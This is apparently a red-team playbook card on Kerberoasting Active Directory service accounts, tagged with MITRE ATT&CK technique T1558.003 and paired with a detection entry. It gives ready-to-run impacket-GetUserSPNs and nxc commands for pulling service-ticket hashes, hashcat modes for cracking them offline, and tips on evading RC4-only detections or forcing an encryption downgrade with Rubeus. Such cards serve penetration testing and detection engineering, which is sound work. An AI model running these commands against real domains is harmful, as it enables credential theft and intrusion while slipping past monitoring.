---
id: kerberoast-getuserspns
title: Kerberoast SPNs (request + crack offline)
section: Microsoft Windows Kerberos — TCP 88
phase: Credential Access
attack:
  tactic: TA0006
  techniques: [T1558.003]
platform: [windows, network]
source: hacktheplanet §"Microsoft Windows Kerberos — TCP 88"
pair: kerberoasting-4769
---

Needs valid domain creds; requests TGS tickets for accounts with SPNs and
dumps crackable hashes you crack offline (`hashcat -m 13100`). Neither of these
forces the etype — the ticket comes back under the SPN account's
`msDS-SupportedEncryptionTypes`, so an AES-only service account yields an AES
hash (`-m 19700`) and never trips an RC4-only detection. Force the `0x17`
downgrade with Rubeus `/tgtdeleg` or Orpheus if you want the faster crack and
don't mind being the loud one.

```sh
impacket-GetUserSPNs -request -dc-ip {{rhost}} {{domain}}/{{user}}
nxc ldap {{rhost}} -u {{user}} -p {{password}} --kerberoasting kerb.txt
```
